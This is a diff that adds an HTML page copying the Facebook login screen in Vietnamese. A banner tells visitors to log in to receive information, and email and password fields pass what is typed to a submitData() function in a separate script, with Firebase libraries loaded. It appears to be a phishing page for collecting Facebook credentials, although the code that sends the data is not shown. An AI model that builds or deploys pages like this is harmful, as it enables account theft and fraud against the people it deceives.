@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="facebook.css">
+</head>
+<body>
+<script src="https://www.gstatic.com/firebasejs/8.9.1/firebase.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-analytics.js"></script>
+<script src="facebook.js"></script>
+    <div class="textbox">
+        <p class="noti_input" id="noti_input">Vui lòng đăng nhập để nhận thông tin</p>
+        <h1>
+            facebook
+        </h1>
+        <h2>
+            Facebook giúp bạn kết nối và chia sẻ<br> với mọi người trong cuộc sống của bạn.
+        </h2>
+    </div>
+
+
+    <div class="container">
+<div class="form">
+    <form class="form" onSubmit="submitData() ;return false;">
+        <input type="text" class="text" placeholder="Nhập vào email của bạn" id="username" required> <br>
+        <input type="password" class="text" placeholder="Nhập vào password của bạn" id="password" required><br>
+        <button onClick = "submitData()">Đăng nhập</button>
+    </form>
+
+
+    <p><a href="">Quên mật khẩu?</a><br></p>
+    <div class="btn">
+        <button>Tạo tài khoản mới</button>
+     </div>
+</div>
+</div>
+</body>
+</html>
